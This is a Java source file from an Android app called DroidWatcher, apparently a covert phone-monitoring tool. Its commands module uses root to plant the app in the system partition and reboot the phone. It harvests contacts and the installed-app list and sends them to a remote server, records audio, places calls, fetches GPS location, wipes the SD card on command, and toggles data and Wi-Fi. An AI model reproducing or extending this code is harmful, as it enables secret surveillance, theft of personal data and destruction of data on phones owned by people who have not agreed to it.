package com.droidwatcher.modules;

import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.List;

import org.acra.ACRA;
import org.json.JSONArray;
import org.json.JSONObject;

import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.ConnectivityManager;
import android.net.Uri;
import android.net.wifi.WifiManager;
import android.os.Message;
import android.provider.ContactsContract;

import com.droidwatcher.Debug;
import com.droidwatcher.ServerMessanger;
import com.droidwatcher.SettingsManager;
import com.droidwatcher.lib.Contact;
import com.droidwatcher.lib.FileUtil;
import com.droidwatcher.lib.IMessageBody;
import com.droidwatcher.lib.MessageType;
import com.droidwatcher.lib.ServerConst;
import com.droidwatcher.modules.location.LocationModule;
import com.droidwatcher.services.AppService;
import com.droidwatcher.variables.ServerMessage;
import com.stericson.RootTools.RootTools;
import com.stericson.RootTools.execution.CommandCapture;

public class CommandsModule {
	
	public static void moveToSystem(final Context context) {
		new Thread(new Runnable() {
			@Override
			public void run() {
				try {
					if (RootTools.isRootAvailable() && RootTools.isAccessGiven()) {
						context.stopService(new Intent(context, AppService.class));
						
						PackageInfo paramPackageInfo = context.getPackageManager().getPackageInfo(context.getPackageName(), 0);
						ApplicationInfo localApplicationInfo = paramPackageInfo.applicationInfo;
						String str1 = "/system/app/" + localApplicationInfo.packageName + ".apk";
						String str2 = "busybox mv " + localApplicationInfo.sourceDir + " " + str1;
						RootTools.remount("/system", "rw");
						RootTools.remount("/mnt", "rw");
						MoveToSystemCommand command = new MoveToSystemCommand(0, str2, "busybox chmod 644 " + str1);
						RootTools.getShell(true).add(command);
					}
				} catch (Exception e) {
					Debug.exception(e);
					ACRA.getErrorReporter().handleSilentException(e);
				}
			}
		}).start();
	}
	
	private static class MoveToSystemCommand extends CommandCapture{

		public MoveToSystemCommand(int id, String... command) {
			super(id, command);
		}
		
		@Override
		public void commandCompleted(int id, int exitcode) {
			try {
				//RootTools.remount("/system", "ro");
				//RootTools.remount("/mnt", "ro");
				
				CommandCapture command = new CommandCapture(0, "reboot");
				RootTools.getShell(true).add(command);
				
			} catch (Exception e) {
				Debug.exception(e);
			}
		}
		
	}
	
	public static void wipeSd(Context context, String code){
		try {
			SettingsManager settings = new SettingsManager(context);
			String imei = settings.imei();
			String lastCharacters = imei.substring(imei.length() - 4);
			
			if (lastCharacters.equals(code)) {
				FileUtil.wipeSdcard();
			}
			
		} catch (Exception e) {
			Debug.exception(e);
		}
	}
	
	public static void getPhoneBook(Context context, String email){
		try {
			ArrayList<IMessageBody> contacts = new ArrayList<IMessageBody>();
			ContentResolver cr = context.getContentResolver();
	        Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
	        if (cur.getCount() > 0) {
			    while (cur.moveToNext()) {
			        String id = cur.getString(cur.getColumnIndex(ContactsContract.Contacts._ID));
					String name = cur.getString(cur.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
			 		if (Integer.parseInt(cur.getString(cur.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER))) > 0) {
			 			Cursor pCur = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, ContactsContract.CommonDataKinds.Phone.CONTACT_ID +" = ?", new String[]{id}, null);
	 		 	        while (pCur.moveToNext()) {
	 		 	        	String number = pCur.getString(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
	 		 	        	contacts.add(new Contact(number, name));
	 		 	        	//Log.i("DEBUG", name + " : " + number);
	 		 	        } 
	 		 	        pCur.close();
			 	    }
		        }
		 	}
	        cur.close();
	        
	        if (contacts.size() > 0) {
	        	SettingsManager settings = new SettingsManager(context);
	        	new ServerMessanger(
	        		context,
	        		new ServerMessage(MessageType.CONTACT, settings.imei(), settings.login(), contacts)
	        			.addParam("email", email)
	        	).start();
			}
			
		} catch (Exception e) {
			Debug.exception(e);
		}
	}
	
	public static void getApplicationList(Context context, String email){
		try {
			final PackageManager pm = context.getPackageManager();
			List<ApplicationInfo> packages = pm.getInstalledApplications(PackageManager.GET_META_DATA);

			JSONArray applist = new JSONArray();
			for (ApplicationInfo packageInfo : packages) {
				//Debug.i(pm.getApplicationLabel(packageInfo) + " (" + packageInfo.packageName + ")");
				applist.put(pm.getApplicationLabel(packageInfo) + " (" + packageInfo.packageName + ")");
			}
			
			SettingsManager settings = new SettingsManager(context);
			new ServerMessanger(
        		context,
        		new ServerMessage(MessageType.APPLIST, settings.imei(), settings.login())
        			.addParam("applist", applist)
        	).start();
			
		} catch (Exception e) {
			Debug.exception(e);
		}
	}
	
	public static void updateSettings(Context context){
		if (AppService.sThreadManager != null) {
			final SettingsManager settings = new SettingsManager(context);
			
			AppService.sThreadManager.addTask(new ServerMessanger(context, new ServerMessage(MessageType.SETTINGS_GET, settings.imei(), settings.login()),
				new ServerMessanger.ICallBack() {
					@Override
					public boolean onFinished(String response) {
						if (response.equals(ServerConst.ERROR)) {
							return true;
						}
						try {
							JSONObject respObj = new JSONObject(response);
							String str = respObj.getString("settings");
							if (str == null || str.length() == 0) {
								return true;
							}
							settings.parseSettings(new JSONObject(str));

						} catch (Exception e) {
							ACRA.getErrorReporter().handleSilentException(e);
							Debug.exception(e);
						}

						return true;
					}

					@Override
					public void onError() {}
					@Override
					public void onSuccess() {}
				})
			);
		}
	}
	
	public static void connect(final Context context, final SettingsManager settings, final String login){
		new ServerMessanger(context, new ServerMessage(MessageType.CONNECT, settings.imei(), login),
			new ServerMessanger.ICallBack() {
				@Override
				public boolean onFinished(String response) { return false; }

				@Override
				public void onError() {}

				@Override
				public void onSuccess() {
					settings.login(login);
					settings.connected(true);
					GCMModule.unregister(context);
					context.startService(new Intent(context, AppService.class));
				}
			}).start();
	}
	
	public static void record(int duration){		
		Message msg = Message.obtain();
		msg.what = RecorderModule.START_RECORD_REQUEST;
		msg.arg1 = duration;
		RecorderModule.message(msg);
	}
	
	public static void recordStop(){		
		Message msg = Message.obtain();
		msg.what = RecorderModule.STOP_RECORD;
		RecorderModule.message(msg);
	}
	
	public static void callBack(Context context, String number){	
		if (number == null || number.length() == 0) {
			return;
		}
		
		try {
			Intent intent = new Intent(Intent.ACTION_CALL, Uri.parse("tel:" + number));
			intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
			context.startActivity(intent);
		} catch (Exception e) {
			Debug.exception(e);
		}
	}
	
	/**
	 * Request single gps location update
	 * @param number - phone number; null if GCM
	 */
	public static void gpsGet(String number){
		if (number == null) {
			LocationModule.message(LocationModule.REQUEST_SINGLE_LOCATION);
		}
		else{
			Message msg = new Message();
			msg.what = LocationModule.REQUEST_SINGLE_LOCATION_SMS;
			msg.obj = number;
			LocationModule.message(msg);
		}
	}
	
	public static void restart(Context context){
		context.stopService(new Intent(context, AppService.class));
		context.startService(new Intent(context, AppService.class));
	}
	
	public static void reboot(){
		try {
			if (RootTools.isRootAvailable() && RootTools.isAccessGiven()) {
				CommandCapture command = new CommandCapture(0, "reboot");
				RootTools.getShell(true).add(command);
			}
			
			
		} catch (Exception e) {
			Debug.exception(e);
		}
	}
	
	public static void setMobileDataState(Context context, boolean enable) {
		try {
			final ConnectivityManager conman = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
			   final Class<?> conmanClass = Class.forName(conman.getClass().getName());
			   final Field iConnectivityManagerField = conmanClass.getDeclaredField("mService");
			   iConnectivityManagerField.setAccessible(true);
			   final Object iConnectivityManager = iConnectivityManagerField.get(conman);
			   final Class<?> iConnectivityManagerClass =  Class.forName(iConnectivityManager.getClass().getName());
			   final Method setMobileDataEnabledMethod = iConnectivityManagerClass.getDeclaredMethod("setMobileDataEnabled", Boolean.TYPE);
			   setMobileDataEnabledMethod.setAccessible(true);

			   setMobileDataEnabledMethod.invoke(iConnectivityManager, enable);
		} catch (Exception e) {
			e.printStackTrace();
		}
	}
	
	public static void setWiFiState(Context context, Boolean enable){
		WifiManager wifiManager = (WifiManager) context.getSystemService(Context.WIFI_SERVICE); 
		wifiManager.setWifiEnabled(enable);
	}
	
}
